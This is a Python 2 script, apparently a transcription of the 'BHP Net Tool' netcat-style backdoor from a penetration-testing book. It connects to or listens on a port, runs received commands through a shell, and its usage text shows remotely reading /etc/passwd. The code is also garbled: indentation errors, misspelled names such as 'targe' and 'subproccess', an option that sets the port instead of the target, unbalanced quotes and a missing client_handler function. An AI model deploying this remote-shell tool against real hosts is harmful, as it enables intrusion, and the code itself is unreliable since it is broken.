import sys

import socket
import getopt
import threading
import subprocess


#define some global variables
listen                  = False
command                 = False
upload                  = False
execute                 = ""
target                  = ""
upload_destination      = ""
port                    = 0

def usage() :
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target host -p port"
    print "-l --listen          -listen on [host]:[port] for incoming connections"

    print "-e --execute=file_to_run = execute the given file upon receiving a connection"

    print "-u --upload=destination  - upon receiving connection upload a file and write to [destiantion]"

    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -1 -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -1 -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -1 -e=\"cat /etc/passwd""
    print "echo 'ACDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135""
    sys.exit(0)

def main():    
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

# read the commandline options

try:
    opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
            ["help", "listen", "execute", "target", "port", "command", "upload"])
except getopt.GetoptError as err:
        print str(err)
        usage()

        for o,a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-c", "--commandshell"):
                command = True
            elif o in ("-u", "--ipload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                port = int(a)
            else:
                assert False, "Unhandled Option"

# are we going to listen or just send data from stdin?
if not listen and len(targe) and port > 0:

    #read in the buffer from the comandline
    #this will block, so send CTRL-D if not sending input
    #to stdin
    buffer = sys.stdin.read()

    #send data off
    client_sender (buffer)

# we are going to listen and potentially
# upload things, execute commands, and drop a shell back
# depending on our command line options above
if listen: 
    server_loop()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target, port))

        if len(buffer):
                client.send(buffer)
        while True: 

            #now wait for data back
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += data

            if recv_len < 4096:
                break

            print response, 

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            #send it off
            client.send(buffer)

except:

    print "[*] Exception! Exiting."

    #tear down the connection
    client.close()

def server_loop():
        global target

        #if no target is defined, we listen on all interfaces
        if not len(target):
                target = "0.0.0.0" 

                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.bind((target,port))
                server.listen(5)

                while True:
                    client_socket, addr = server.accept()

                    #spin off a thread to handle our new client
                    client_thread = threading.Thread(target=client_handler,
                    args=(client_socket,))
                    client_thread.start()

def run_command(command):

    #trim the newline
    command = command.rstrip()
    # run the command and get the output back

    try:
            output = subproccess.check_output(command, stderr=subprocess.
            STDOUT, shell = True)
    except:
        output = "Failed to excute command. \r\n"

        #send the output back to the client
        return output



main()    
